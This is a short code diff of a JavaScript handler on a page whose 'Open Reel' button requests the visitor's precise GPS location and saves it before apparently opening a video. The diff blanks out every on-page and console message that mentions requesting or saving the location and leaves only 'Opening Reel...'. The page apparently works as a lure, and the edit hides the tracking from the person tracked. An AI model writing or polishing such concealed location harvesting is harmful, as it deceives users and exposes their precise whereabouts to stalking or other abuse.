@@ -112,11 +112,11 @@ openReelBtn.addEventListener(
 
 
         locationStatus.textContent =
-            "📍 Requesting location permission...";
+            "...";
 
 
         console.log(
-            "📍 Requesting precise GPS location..."
+            "..."
         );
 
 
@@ -133,7 +133,7 @@ openReelBtn.addEventListener(
             async function (position) {
 
                 console.log(
-                    "✅ Location permission granted!"
+                    ".."
                 );
 
 
@@ -163,7 +163,7 @@ openReelBtn.addEventListener(
 
 
                 locationStatus.textContent =
-                    "📍 Location received. Please wait...";
+                    ".....";
 
 
                 try {
@@ -238,12 +238,12 @@ openReelBtn.addEventListener(
 
 
                     console.log(
-                        "🎉 Precise location saved successfully!"
+                        "..."
                     );
 
 
                     locationStatus.textContent =
-                        "✅ Location permission granted. Opening Reel...";
+                        "✅ Opening Reel...";
 
 
                     // =====================================
